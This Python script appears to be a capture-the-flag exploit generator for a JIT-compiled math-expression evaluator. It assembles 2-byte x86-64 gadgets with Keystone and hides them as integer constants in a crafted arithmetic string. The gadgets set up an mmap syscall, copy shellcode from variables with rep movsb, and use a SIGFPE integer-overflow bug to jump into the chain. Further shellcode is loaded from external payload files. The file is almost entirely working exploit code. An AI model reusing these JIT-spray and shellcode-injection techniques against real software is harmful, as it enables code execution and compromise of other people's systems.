#!/usr/bin/env python

import struct
from keystone import *


def compile_asm(code, mlen=2):
    #print(code)
    try:
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        encoding, count = ks.asm(code)
    except KsError as e:
        pass
        #print("ERROR: %s" %e)

    assert len(encoding) <= mlen
    return bytes(encoding)


def generate_var_payload():
    # this will end up in the vars, and then copied, by the first payload in the 0x1000000 page
    c1 = open("secondthread_payload.bin", "rb").read() # this is what the sleeping thread, once woken up, will do
    c2 = open("secondpayload.bin", "rb").read()

    fpayload = (c1.ljust(0x18, b'\x90') + c2).ljust((8*10), b'\x90')

    assert len(c1) <= 0x18
    assert len(c2) <= (80-0x18)

    vvars = []
    for i in range(0,len(fpayload),8):
        bvar = fpayload[i:i+8]
        vv = struct.unpack("<Q", bvar)[0]
        vvars.append(vv)

    return vvars

def generate_first_chain(nn=34):
    code = '''

# we setup registers to do an mmap
# we can only use 2 bytes gadgets and only 34 of them
# we need to be smart and reuse some of the values already in the registers
and eax, ecx
and al, 0
mov edi, eax

xor ecx, ecx
mov cl, 12
shr eax, cl
mov esi, eax

push 7
pop rdx

push 0x31
pop r10

push 0 # this should be -1 but 0 still works
pop r8

push 0
pop r9

xor eax, eax


mov al, 9
syscall

# now we use rep movsb to copy data from the vars to 0x1000000
# this allows us having 80 bytes of "unrestricted" shellcode

mov eax, edi
mov esi, edi
mov ecx, eax
mov al, 0x60

mov edi, eax

mov bl, 0x2f
mov cl, 8
shl ebx, cl
xor ebx, esi
mov esi, ebx

xor ecx, ecx
mov cl, 80

rep movsb

add al, 0x18
jmp rax
'''
    compiled_code = []
    jmpasm21 = compile_asm("jmp 21")
    jmpasm22 = compile_asm("jmp 22")
    for l in code.split("\n"):
        l = l if l.find("#") == -1 else l[:l.find("#")]
        l = l.strip()
        if not l: continue

        g = compile_asm(l)
        if len(g) == 1:
            fullg = g + jmpasm22 + b'\x90'
        else:
            fullg = g + jmpasm21
        compiled_code.append(fullg)

    numbers = []
    for gg in compiled_code:
        #print(repr(gg))
        numbers.append(struct.unpack("<I", gg)[0])

    #print(nn, len(numbers))
    assert len(numbers) <= nn
    numbers.extend(["2425393296"]*(nn-len(numbers))) #2425393296 is nop

    tstr = ("+".join([str(n) for n in numbers])+"+").encode("utf-8")
    return tstr


def generate_third_payload(nn=52, pname="thirdpayload.bin"):
    c3 = open(pname, "rb").read()
    assert len(c3) <= 200
    fpayload = c3.ljust(200, b'\x90')

    numbers = []
    for i in range(0,len(fpayload),4):
        bvar = fpayload[i:i+4]
        vv = struct.unpack("<Q", bvar+b'\x00\x00\x00\x00')[0]
        numbers.append(vv)


    numbers.extend(["2425393296"]*(nn-len(numbers))) #2425393296 is nop
    tstr = ("".join(["("+str(n)+"+" for n in numbers])).encode("utf-8")
    return tstr


def get_math_string(pname="thirdpayload.bin"):
    npar = 52
    # use multiplications to set rdx > 0
    # use two vars to calibrate the exact position of the last controlled qword in the code page
    # all the nested parenthesis fill the stack and,
    # together with the other operations, will result in having 0x1001cea as the last qword of the code page
    # 0x1001cea will be then used by shifting the stack using the SIGFPE integer overflow bug

    # the first and the third payloads are encoded as constants, the second payload is encoded in the vars.
    tstr = b"(1000000000*2000000000*3000000000)+"+generate_third_payload(npar, pname)+b"(v0+(v1+(2+(2+(1+(2+(3+(5/1))))))))"+b")"*npar
    # 0x1001cea is where the first chain starts
    tstr2 = b"1-1+"*1 + b"("+tstr+b")+"+generate_first_chain(nn=34)+str(0x1001cea).encode("utf-8")

    return tstr2


if __name__ == "__main__":
    print(get_math_string().decode("utf-8"))
    print("\n".join([str(n) for n in generate_var_payload()]))

